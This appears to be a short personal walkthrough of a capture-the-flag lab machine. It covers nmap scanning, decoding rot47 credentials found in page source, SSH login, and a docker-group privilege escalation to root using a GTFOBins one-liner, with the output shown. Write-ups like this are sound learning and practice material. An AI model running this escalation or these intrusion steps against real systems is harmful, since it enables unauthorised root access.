@@ -1,0 +1,32 @@
+1.nmap -A -O -sS 10.0.2.43
+2.view-source:http://10.0.2.43/
+found that some data are rot47 encoded.
+3.
+D92:=6?5C2
+4J36CDA=@:E`
+is 
+shailendra
+cybersploit1
+4.
+Lets try ssh
+ssh shailendra@10.0.2.43
+password:cybersploit1
+
+5. I typed id and i saw that it runs docker, let's try privesc.
+
+docker images
+nothing found
+I tried GTFOBins docker shell
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+Unable to find image 'alpine:latest' locally
+latest: Pulling from library/alpine
+df20fa9351a1: Pull complete 
+Digest: sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321
+Status: Downloaded newer image for alpine:latest
+sh-4.4#
+The image downloaded and now i am the root
+
+
+
